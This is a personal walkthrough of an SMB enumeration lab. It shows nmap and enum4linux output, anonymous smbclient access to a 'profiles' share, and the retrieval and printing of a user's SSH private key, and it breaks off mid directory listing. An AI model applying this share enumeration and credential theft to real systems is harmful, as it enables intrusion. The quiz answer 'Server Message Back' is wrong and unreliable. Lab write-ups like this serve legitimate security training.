TASK 2: SMB
- Server Message block Protocol
- Client-server communication protocol used for sharing access to files, printers,serial ports and other resources on a network.
- The SMB protocol is known as a response-request protocol, meaning that it transmits multiple messages between the client and server to establish a connection. 
- Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX.
- Working
 -> Once they have established a connection, clients can then send commands (SMBs) to the server that allow them to access shares, open files, read and write files, and generally do all the sort of things that you want to do with a file system.
 -> Microsoft Windows operating systems since Windows 95 have included client and server SMB protocol support. 
 -> Samba, an open source server that supports the SMB protocol, was released for Unix systems.

a. What does SMB stand for?
sol. Server Message Back

b. What type of protocol is SMB? 
sol. Response-request

c. What do clients connect to servers using?    
sol. TCP/IP

d. What systems does Samba run on?
sol. Unix

TASK 3: Enumerating SMB
- Enumeration- It's the process of gathering information on a target in order to find potential attack vectors and aid in exploitation.
- Enumeration can be used to gather usernames, passwords, network information, hostnames, application data, services, or any other information that may be valuable to an attacker.
# NOTE #
- Attack vectors are the methods or pathways that malicious actors use to gain unauthorized access to a system, network, or application in order to exploit its vulnerabilities. 
 eg. Man-in-the-middle, Social engineering, etc

- Typically, there are SMB share drives on a server that can be connected to and used to view or transfer files. 
- SMB can often be a great starting point for an attacker looking to discover sensitive information — you'd be surprised what is sometimes included on these shares.
- The first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, applications, structure and operating system of the target machine.

Enum4Linux
- Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems
- It is basically a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB.
- Syntax: enum4linux [options] ip

TAG            FUNCTION
-U             get userlist
-M             get machine list
-N             get namelist dump (different from -U and-M)
-S             get sharelist
-P             get password policy information
-G             get group and member list
-a             all of the above (full basic enumeration)

a. Conduct an nmap scan of your choosing, How many ports are open?
sol. 3
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- -T4 -A 10.10.133.31
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-10 11:22 EDT
Nmap scan report for 10.10.133.31
Host is up (0.20s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 91:df:5c:7c:26:22:6e:90:23:a7:7d:fa:5c:e1:c2:52 (RSA)
|   256 86:57:f5:2a:f7:86:9c:cf:02:c1:ac:bc:34:90:6b:01 (ECDSA)
|_  256 81:e3:cc:e7:c9:3c:75:d7:fb:e0:86:a0:01:41:77:81 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=9/10%OT=22%CT=1%CU=34765%PV=Y%DS=2%DC=T%G=Y%TM=66E0
OS:6841%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)SEQ(S
OS:P=103%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=9)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI
OS:=Z%II=I%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST
OS:11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=
OS:F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: POLOSMB; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: polosmb
|   NetBIOS computer name: POLOSMB\x00
|   Domain name: \x00
|   FQDN: polosmb
|_  System time: 2024-09-10T15:39:39+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: POLOSMB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-09-10T15:39:39
|_  start_date: N/A

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   244.06 ms 10.9.0.1
2   244.27 ms 10.10.133.31

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1019.96 seconds

b. What ports is SMB running on?
sol. 139/445

c. Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?   
sol. WORKGROUP

┌──(kali㉿kali)-[~]
└─$ sudo enum4linux -a 10.10.133.31
[sudo] password for kali: 
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Sep 10 11:30:47 2024
 =========================================( Target Information )=========================================
Target ........... 10.10.133.31
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 ============================( Enumerating Workgroup/Domain on 10.10.133.31 )============================
[+] Got domain/workgroup name: WORKGROUP
 ================================( Nbtstat Information for 10.10.133.31 )================================
Looking up status of 10.10.133.31
        POLOSMB         <00> -         B <ACTIVE>  Workstation Service
        POLOSMB         <03> -         B <ACTIVE>  Messenger Service
        POLOSMB         <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
        MAC Address = 00-00-00-00-00-00
 ===================================( Session Check on 10.10.133.31 )===================================
[+] Server 10.10.133.31 allows sessions using username '', password ''                                              
 ================================( Getting domain SID for 10.10.133.31 )================================
Domain Name: WORKGROUP                                                                                              
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup                                                
 ===================================( OS information on 10.10.133.31 )===================================
[E] Can't get OS info with smbclient                                                                                
[+] Got OS info for 10.10.133.31 from srvinfo:                                                                      
        POLOSMB        Wk Sv PrQ Unx NT SNT polosmb server (Samba, Ubuntu)                                          
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03
 =======================================( Users on 10.10.133.31 )=======================================
Use of uninitialized value $users in print at ./enum4linux.pl line 972.                                             
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.
Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.
 =================================( Share Enumeration on 10.10.133.31 )=================================
        Sharename       Type      Comment
        ---------       ----      -------
        netlogon        Disk      Network Logon Service
        profiles        Disk      Users profiles
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            POLOSMB

[+] Attempting to map shares on 10.10.133.31                                                                        
[E] Can't understand response:                                                                                                                                        
tree connect failed: NT_STATUS_BAD_NETWORK_NAME                                                                     
//10.10.133.31/netlogon Mapping: N/A Listing: N/A Writing: N/A
//10.10.133.31/profiles Mapping: OK Listing: OK Writing: N/A
//10.10.133.31/print$   Mapping: DENIED Listing: N/A Writing: N/A
[E] Can't understand response:                                                                                                                                            
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                          
//10.10.133.31/IPC$     Mapping: N/A Listing: N/A Writing: N/A
 ============================( Password Policy Information for 10.10.133.31 )============================
[+] Attaching to 10.10.133.31 using a NULL share
[+] Trying protocol 139/SMB...
[+] Found domain(s):
        [+] POLOSMB
        [+] Builtin
[+] Password Info for Domain: POLOSMB
        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000
                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0
        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 
[+] Retieved partial password policy with rpcclient:                                                                                                                                                          
Password Complexity: Disabled                                                                                       
Minimum Password Length: 5
 =======================================( Groups on 10.10.133.31 )=======================================
[+] Getting builtin groups:                                                                                         
[+]  Getting builtin group memberships:                                                                              
[+]  Getting local groups:                                                                                         
[+]  Getting local group memberships:                                                                               
[+]  Getting domain groups:                                                                                         
[+]  Getting domain group memberships:                                                                                          
 ==================( Users on 10.10.133.31 via RID cycling (RIDS: 500-550,1000-1050) )==================
[I] Found new SID:                                                                                                  
S-1-22-1                                                                                                            
[I] Found new SID:                                                                                                  
S-1-5-32                                                                                                            
[I] Found new SID:                                                                                                  
S-1-5-32                                                                                                            
[I] Found new SID:                                                                                                  
S-1-5-32                                                                                                            
[I] Found new SID:                                                                                                  
S-1-5-32                                                                                                            
[+] Enumerating users using SID S-1-5-21-434125608-3964652802-3194254534 and logon username '', password ''                                                    
S-1-5-21-434125608-3964652802-3194254534-501 POLOSMB\nobody (Local User)                                            
S-1-5-21-434125608-3964652802-3194254534-513 POLOSMB\None (Domain Group)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                                                          
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                   
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                            
S-1-22-1-1000 Unix User\cactus (Local User)                                                                     
 ===============================( Getting printer info for 10.10.133.31 )===============================
No printers returned.                                                                                               
enum4linux complete on Tue Sep 10 11:46:45 2024

d. What comes up as the name of the machine?        
sol. POLOSMB

e. What operating system version is running?    
sol. 6.1

f. What share sticks out as something we might want to investigate?    
sol. profiles

TASK 4: Types of SMB Exploit
- While there are vulnerabilities such as CVE-2017-7494 that can allow remote code execution by exploiting SMB, you're more likely to encounter a situation where the best way into a system is due to misconfigurations in the system.
- we're going to be exploiting anonymous SMB share access- a common misconfiguration that can allow us to gain information that will lead to a shell.
- Method Breakdown
So, from our enumeration stage, we know:
    - The SMB share location
    - The name of an interesting SMB share
SMBClient
Because we're trying to access an SMB share, we need a client to access resources on servers.
We will be using SMBClient because it's part of the default samba suite.
We can remotely access the SMB share using the syntax:
smbclient //[IP]/[SHARE]
Followed by the tags:
-U [name] : to specify the user
-p [port] : to specify the port

a. What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?
sol. smbclient //10.10.10.2/secret -U suit -p 445

b. Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn't require authentication to view the files. We can do this easily by:
- using the username "Anonymous"
- connecting to the share we found during the enumeration stage
- and not supplying a password.
Does the share allow anonymous access? Y/N?
sol. y

┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.133.31/profiles -U Anonymous -p139,445                                                        Password for [WORKGROUP\Anonymous]:
Try "help" to get a list of possible commands.
smb: \>

c. Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to? 
sol. John Cactus

┌──(root㉿kali)-[/home/kali]
└─# smbclient //10.10.59.204/profiles -U Anonymous -p139,445
Password for [WORKGROUP\Anonymous]:
Try "help" to get a list of possible commands.
smb: \> ? 
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!           
###############################
After searching on the commands I tried ls and cd to explore directories.
D - directory
DH - hidden directory
H - hidden file
N - normal files

###############################
smb: \> ls
  .                                   D        0  Tue Apr 21 07:08:23 2020
  ..                                  D        0  Tue Apr 21 06:49:56 2020
  .cache                             DH        0  Tue Apr 21 07:08:23 2020
  .profile                            H      807  Tue Apr 21 07:08:23 2020
  .sudo_as_admin_successful           H        0  Tue Apr 21 07:08:23 2020
  .bash_logout                        H      220  Tue Apr 21 07:08:23 2020
  .viminfo                            H      947  Tue Apr 21 07:08:23 2020
  Working From Home Information.txt      N      358  Tue Apr 21 07:08:23 2020
  .ssh                               DH        0  Tue Apr 21 07:08:23 2020
  .bashrc                             H     3771  Tue Apr 21 07:08:23 2020
  .gnupg                             DH        0  Tue Apr 21 07:08:23 2020

                12316808 blocks of size 1024. 7432700 blocks available
smb: \> get .profile profile
getting file \.profile of size 807 as profile (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
smb: \> get .sudo_as_admin_successful sudoadmin
getting file \.sudo_as_admin_successful of size 0 as sudoadmin (0.0 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \> get .viminfo viminfo
NT_STATUS_ACCESS_DENIED opening remote file \.viminfo
smb: \> get Working From Home Information.txt workinfo
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Working
smb: \> get Working From Home Information.txt workinfo.txt
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Working
smb: \> ^Z
zsh: suspended  smbclient //10.10.59.204/profiles -U Anonymous -p139,445
                                                                                                                   
┌──(root㉿kali)-[/home/kali]
└─# ls
clubweb.txt  Desktop  Documents  Downloads  Music  nessus  Pictures  profile  Public  sudoadmin  Templates  Videos
                                                                                                                   
┌──(root㉿kali)-[/home/kali]
└─# cat sudoadmin               
                                                                                                                   
┌──(root㉿kali)-[/home/kali]
└─# nano sudoadmin           
                                                                                                                   
┌──(root㉿kali)-[/home/kali]
└─# fg
[1]  + continued  smbclient //10.10.59.204/profiles -U Anonymous -p139,445

smb: \> ls
  .                                   D        0  Tue Apr 21 07:08:23 2020
  ..                                  D        0  Tue Apr 21 06:49:56 2020
  .cache                             DH        0  Tue Apr 21 07:08:23 2020
  .profile                            H      807  Tue Apr 21 07:08:23 2020
  .sudo_as_admin_successful           H        0  Tue Apr 21 07:08:23 2020
  .bash_logout                        H      220  Tue Apr 21 07:08:23 2020
  .viminfo                            H      947  Tue Apr 21 07:08:23 2020
  Working From Home Information.txt      N      358  Tue Apr 21 07:08:23 2020
  .ssh                               DH        0  Tue Apr 21 07:08:23 2020
  .bashrc                             H     3771  Tue Apr 21 07:08:23 2020
  .gnupg                             DH        0  Tue Apr 21 07:08:23 2020

                12316808 blocks of size 1024. 7506728 blocks available
smb: \> get Working From Home Information.txt work.txt
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Working
smb: \> quit
#####################################################################################################                                                                                            
┌──(root㉿kali)-[/home/kali]
└─# smbclient //10.10.59.204/profiles -U Anonymous -p139,445
Password for [WORKGROUP\Anonymous]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 21 07:08:23 2020
  ..                                  D        0  Tue Apr 21 06:49:56 2020
  .cache                             DH        0  Tue Apr 21 07:08:23 2020
  .profile                            H      807  Tue Apr 21 07:08:23 2020
  .sudo_as_admin_successful           H        0  Tue Apr 21 07:08:23 2020
  .bash_logout                        H      220  Tue Apr 21 07:08:23 2020
  .viminfo                            H      947  Tue Apr 21 07:08:23 2020
  Working From Home Information.txt      N      358  Tue Apr 21 07:08:23 2020
  .ssh                               DH        0  Tue Apr 21 07:08:23 2020
  .bashrc                             H     3771  Tue Apr 21 07:08:23 2020
  .gnupg                             DH        0  Tue Apr 21 07:08:23 2020
g
                12316808 blocks of size 1024. 7412948 blocks available
smb: \> get Working From Home Information.txt Working_from_home_information.txt
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Working
smb: \> get "Working From Home Information.txt"
getting file \Working From Home Information.txt of size 358 as Working From Home Information.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> get .bashrc 
getting file \.bashrc of size 3771 as .bashrc (3.9 KiloBytes/sec) (average 2.2 KiloBytes/sec)
smb: \> cd .gnupg\
smb: \.gnupg\> ls
NT_STATUS_ACCESS_DENIED listing \.gnupg\*
smb: \.gnupg\> cd ..
smb: \> cd .ssh\
smb: \.ssh\> ls
  .                                   D        0  Tue Apr 21 07:08:23 2020
  ..                                  D        0  Tue Apr 21 07:08:23 2020
  id_rsa                              A     1679  Tue Apr 21 07:08:23 2020
  id_rsa.pub                          N      396  Tue Apr 21 07:08:23 2020
  authorized_keys                     N        0  Tue Apr 21 07:08:23 2020

                12316808 blocks of size 1024. 7357492 blocks available
smb: \.ssh\> get id_rsa
getting file \.ssh\id_rsa of size 1679 as id_rsa (1.8 KiloBytes/sec) (average 2.1 KiloBytes/sec)
smb: \.ssh\> get id_rsa.pub 
getting file \.ssh\id_rsa.pub of size 396 as id_rsa.pub (0.4 KiloBytes/sec) (average 1.6 KiloBytes/sec)
smb: \.ssh\> get authorized_keys 
NT_STATUS_ACCESS_DENIED opening remote file \.ssh\authorized_keys
smb: \.ssh\> cd ..
smb: \> ls
  .                                   D        0  Tue Apr 21 07:08:23 2020
  ..                                  D        0  Tue Apr 21 06:49:56 2020
  .cache                             DH        0  Tue Apr 21 07:08:23 2020
  .profile                            H      807  Tue Apr 21 07:08:23 2020
  .sudo_as_admin_successful           H        0  Tue Apr 21 07:08:23 2020
  .bash_logout                        H      220  Tue Apr 21 07:08:23 2020
  .viminfo                            H      947  Tue Apr 21 07:08:23 2020
  Working From Home Information.txt      N      358  Tue Apr 21 07:08:23 2020
  .ssh                               DH        0  Tue Apr 21 07:08:23 2020
  .bashrc                             H     3771  Tue Apr 21 07:08:23 2020
  .gnupg                             DH        0  Tue Apr 21 07:08:23 2020

                12316808 blocks of size 1024. 7396940 blocks available
smb: \> cd .cache\
smb: \.cache\> ls
NT_STATUS_ACCESS_DENIED listing \.cache\*
smb: \.cache\> cd ..
smb: \> ls
  .                                   D        0  Tue Apr 21 07:08:23 2020
  ..                                  D        0  Tue Apr 21 06:49:56 2020
  .cache                             DH        0  Tue Apr 21 07:08:23 2020
  .profile                            H      807  Tue Apr 21 07:08:23 2020
  .sudo_as_admin_successful           H        0  Tue Apr 21 07:08:23 2020
  .bash_logout                        H      220  Tue Apr 21 07:08:23 2020
  .viminfo                            H      947  Tue Apr 21 07:08:23 2020
  Working From Home Information.txt      N      358  Tue Apr 21 07:08:23 2020
  .ssh                               DH        0  Tue Apr 21 07:08:23 2020
  .bashrc                             H     3771  Tue Apr 21 07:08:23 2020
  .gnupg                             DH        0  Tue Apr 21 07:08:23 2020

                12316808 blocks of size 1024. 7584044 blocks available
smb: \> ^Z
zsh: suspended  smbclient //10.10.59.204/profiles -U Anonymous -p139,445
                                                                                                                   
┌──(root㉿kali)-[/home/kali]
└─# ls
 clubweb.txt   Downloads    Music      profile     Templates
 Desktop       id_rsa       nessus     Public      Videos
 Documents     id_rsa.pub   Pictures   sudoadmin  'Working From Home Information.txt'
                                                                                                                   
┌──(root㉿kali)-[/home/kali]
└─# cat profile    
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
        . "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ] ; then
    PATH="$HOME/.local/bin:$PATH"
fi
                                                                                                                   
┌──(root㉿kali)-[/home/kali]
└─# cat id_rsa    
-----BEGIN RSA PRIVATE KEY-----

-----END RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2+zmi/My2eWfDlN8GT0iEB2qMiPGHNyP/P2On2loGE2W3zT3
sZYtI8XQHk3hstl91wAlnAeBxXo24jbDGC48ude4MFijwbzfOuYvLiENBqmsqvyp
gR6bgW0dMl/0qcn8r80d1Q9eqYPw/lk/IS2jR0mJuhTWC7JlZ1g0iQwYUte/XM37
bqFueZsPzqs1la+ZZ/XCnnrl5TVdZagowahdwpcxAbzeCVvBkv64i03h3F3jCDFE
7iKa+F6Lzf1YryJS6k2Mu5R7lIei9kagH8OfhUq+EGVtcxwjKEuhaKE6Jqv9NxBi
QhnKfNP309HtOJ/u/j8Z5r2UJDsHtQNYVBugvwIDAQABAoIBABgca9YyDoQnEX4P
lw5pTl+38N3YYDLv13VkEwvVEY2AjCbidrlofoBqgnugDDuAbrRwlq75f7e3w2af
nFn9T7kMNmxOe32VCGA7tjZ3dycg2QZR9v9p7KCO5uGL9ZXbyDE56qheLAGnrnck
L7CigUEihc/50tGreESRPgk8YzpJquLS8G00h5GQPnKnboawTI9S+lkKzIuLpLBX
+Bn7lK1jacpnNjA1qkzg6yc7wlfxY9CPhIeuWZTwDAk5fHpPPVUoYRqRPJtAki3s
8mU2bbEtBj/6JqKWljhXkYMgBy6Ua9qaKoRb/FAMivg9VPp13330DIurHsSPHRum
008tKakCgYEA+IXJwrav+Bc3CG6Quc+hl/x7lnfHBmsK3jZP3YJ013/02r1ESyrJ
5+OTp5V7O4eRbdWWAFOHWUAN8m2/JM3hwmNJecrYcFLE4wFrFW3dIRanMuomakN4
snbiDGLhJ4EePXCEaoI0bD9/KUnoqkQpIR26TcZ2m+3WaBnISP98d5UCgYEA4orY
oyzYmdUpNCFK3MDuJMcrTMBwnl6L1DvT15gk/+bG/mAVgHgsyT2SwbbVH43sNmt1
tgGm7xWSOulmJ3ztxhCXwAghlSmP0coPzJq2LuusgdB4kYAwgV7LZB0aqx7aBFyw
oGb7U+fcTmLZpd7gspc+n+JLFkuh9EVmovHW0gMCgYEA8x117Svn4qtbI719iLfM
HbFZeS29HdMzM4QwBsJq6LF850rFdz7pexZOyF7bybVqF+ccMT+FJVMbEbA4j5l0
I0QbibBcoSzm/CbUCYeLDaZqc81JPSS5+uN/aJyGI64U1gevEb5D6C0JiWuK1p2N
Gp9JNHJUb19wIjAulPKRYS0CgYBcUX61CGqATfiLkOGkEk8515xSm72JHDhZVcQf
gJXbXt1K/jbk8pQ1sgzjOjGhuUFAcAw5DnVLyvubXE/P2b4/z7U3gVjGI3jDYleL
5qRFfK8A+8aWbKnXnpy+AIpEn77yth8YTr8u0zbZDrlpOelRfgb8Osiknk+ybrHD
x0/mpwKBgQCsrvJXtzUQwKsskWpYdOKp5sB0BUNCK4nC4T8T4aqGQaa2X87fmGU1
R8KXJ1nCfENH+hCza0ZDxUX7Pf2SWGLlminvZHxvl/BUZanpYaJJGCKSNM05tDsh
71DetLqdn48jtdav/U5i+/lSIQ9fW17JNPtkDD26fAmWg40za1Z51g==                                                                                                                
┌──(root㉿kali)-[/home/kali]
└─# ls        
 clubweb.txt   Downloads    Music      profile     Templates
 Desktop       id_rsa       nessus     Public      Videos
 Documents     id_rsa.pub   Pictures   sudoadmin  'Working From Home Information.txt'
                                                                                                                   
┌──(root㉿kali)-[/home/kali]
└─# cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDb7OaL8zLZ5Z8OU3wZPSIQHaoyI8Yc3I/8/Y6faWgYTZbfNPexli0jxdAeTeGy2X3XACWcB4HFejbiNsMYLjy517gwWKPBvN865i8uIQ0Gqayq/KmBHpuBbR0yX/SpyfyvzR3VD16pg/D+WT8hLaNHSYm6FNYLsmVnWDSJDBhS179czftuoW55mw/OqzWVr5ln9cKeeuXlNV1lqCjBqF3ClzEBvN4JW8GS/riLTeHcXeMIMUTuIpr4XovN/VivIlLqTYy7lHuUh6L2RqAfw5+FSr4QZW1zHCMoS6FooTomq/03EGJCGcp80/fT0e04n+7+PxnmvZQkOwe1A1hUG6C/ cactus@polosmb
                                                                                                                   
┌──(root㉿kali)-[/home/kali]
└─# cat sudoadmin 
                                                                                                                   
┌──(root㉿kali)-[/home/kali]
└─# cat 'Working From Home Information.txt'
John Cactus,

As you're well aware, due to the current pandemic most of POLO inc. has insisted that, wherever 
possible, employees should work from home. As such- your account has now been enabled with ssh
access to the main server.

If there are any problems, please contact the IT department at it@polointernalcoms.uk

Regards,

James
Department Manager 

                                                                                                                   
┌──(root㉿kali)-[/home/kali]
└─# ls -la                                                        
total 208
drwx------ 21 kali kali  4096 Sep 11 13:15  .
drwxr-xr-x  3 root root  4096 Feb 25  2024  ..
-rw-r--r--  1 kali kali   220 Feb 25  2024  .bash_logout
-rw-r--r--  1 kali kali  3771 Sep 11 13:15  .bashrc
-rw-r--r--  1 kali kali  3526 Feb 25  2024  .bashrc.original
drwx------  8 kali kali  4096 May 16 05:29  .BurpSuite
drwxr-xr-x 16 kali kali  4096 Aug 11 15:19  .cache
-rw-r--r--  1 root root  3108 Aug 10 13:54  clubweb.txt
drwxr-xr-x 18 kali kali  4096 Aug 11 15:08  .config
drwx------  3 kali kali  4096 Apr 13 08:51  .dbus
drwxr-xr-x  2 kali kali  4096 Aug 11 15:37  Desktop
-rw-r--r--  1 kali kali    35 Apr  3 11:36  .dmrc
drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Documents
drwxr-xr-x  3 kali kali  4096 Sep  3 10:16  Downloads
-rw-------  1 kali kali 12288 Aug 26 00:09  .exp.swp
-rw-r--r--  1 kali kali 11759 Feb 25  2024  .face
lrwxrwxrwx  1 kali kali     5 Feb 25  2024  .face.icon -> .face
drwx------  3 kali kali  4096 Apr  3 11:36  .gnupg
drwx------  2 kali kali  4096 Apr 13 08:51  .gvfs
-rw-------  1 kali kali     0 Apr  3 11:36  .ICEauthority
-rw-r--r--  1 root root  1679 Sep 11 13:15  id_rsa
-rw-r--r--  1 root root   396 Sep 11 13:15  id_rsa.pub
drwxr-xr-x  4 kali kali  4096 Apr 12 00:40  .java
-rw-------  1 kali kali    20 Aug  7 23:06  .lesshst
drwxr-xr-x  4 kali kali  4096 Apr  3 11:36  .local
drwx------  4 kali kali  4096 Apr  4 13:27  .mozilla
drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Music
drwxr-xr-x  2 kali kali  4096 Apr 11 22:40  nessus
drwxr-xr-x  2 kali kali  4096 May  6 12:48  Pictures
drwx------  3 kali kali  4096 Apr 12 03:00  .pki
-rw-r--r--  1 kali kali   807 Sep 10 12:38  .profile
-rw-r--r--  1 root root   807 Sep 11 13:08  profile
drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Public
-rw-r--r--  1 root root     0 Sep 11 13:09  sudoadmin
-rw-r--r--  1 kali kali     0 Apr  3 12:29  .sudo_as_admin_successful
drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Templates
drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Videos
-rw-------  1 kali kali 12860 Sep  2 12:20  .viminfo
-rw-r--r--  1 root root   358 Sep 11 13:14 'Working From Home Information.txt'
-rw-------  1 kali kali    49 Sep 11 12:41  .Xauthority
-rw-------  1 kali kali  4255 Sep 11 12:47  .xsession-errors
-rw-------  1 kali kali  4182 Sep 11 09:47  .xsession-errors.old
-rw-------  1 kali kali  6281 Sep 10 13:33  .zsh_history
-rw-r--r--  1 kali kali 10868 Feb 25  2024  .zshrc
                                                                                                                   
┌──(root㉿kali)-[/home/kali]
└─# chmod 600 id_rsa
                                                                                                                   
┌──(root㉿kali)-[/home/kali]
└─# ls -la          
total 208
drwx------ 21 kali kali  4096 Sep 11 13:15  .
drwxr-xr-x  3 root root  4096 Feb 25  2024  ..
-rw-r--r--  1 kali kali   220 Feb 25  2024  .bash_logout
-rw-r--r--  1 kali kali  3771 Sep 11 13:15  .bashrc
-rw-r--r--  1 kali kali  3526 Feb 25  2024  .bashrc.original
drwx------  8 kali kali  4096 May 16 05:29  .BurpSuite
drwxr-xr-x 16 kali kali  4096 Aug 11 15:19  .cache
-rw-r--r--  1 root root  3108 Aug 10 13:54  clubweb.txt
